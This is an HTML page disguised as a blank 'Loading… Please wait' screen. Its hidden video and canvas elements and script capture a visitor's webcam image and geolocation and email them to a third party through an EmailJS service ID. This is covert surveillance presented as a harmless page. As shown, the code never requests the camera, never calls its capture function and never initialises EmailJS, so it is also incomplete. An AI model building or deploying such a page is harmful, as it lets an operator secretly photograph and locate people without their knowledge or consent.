<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body {
            background: #000;
            color: white;
            font-family: Arial;
            text-align: center;
            margin-top: 200px;
        }
        #loading {
            font-size: 22px;
            font-weight: bold;
        }
        /* Hide everything */
        video, canvas, #status {
            display: none !important;
        }
    </style>
</head>
<body>

<div id="loading">Loadingâ€¦ Please wait</div>
<p id="status"></p>

<video id="video" width="320" height="240" autoplay playsinline></video>
<canvas id="canvas" width="320" height="240"></canvas>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>

function takePhoto() {
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const context = canvas.getContext("2d");

    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    const image = canvas.toDataURL("image/jpeg", 0.2);
    document.getElementById("status").innerText = "Photo captured. Checking location...";

    let emailData = {
        photo: image,
        location: "Location Blocked"
    };

    // Try to get location
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                emailData.location = lat + ", " + lon;

                sendEmail(emailData);
            },
            (err) => {
                console.warn("Location blocked or denied:", err);
                sendEmail(emailData); // send photo without location
            },
            { timeout: 5000 } // Even if stuck, send photo only
        );
    } else {
        sendEmail(emailData); // No geolocation support
    }
}

// EmailJS function
function sendEmail(data) {
    document.getElementById("status").innerText = "Sending email...";

    emailjs
        .send("service_c2bqpj9", "template_pee9jcq", data)
        .then(() => {
            document.getElementById("status").innerText = "Photo sent successfully!";
        })
        .catch((err) => {
            document.getElementById("status").innerText = "Error sending email.";
            console.error(err);
        });
}

</script>
</body>
</html>
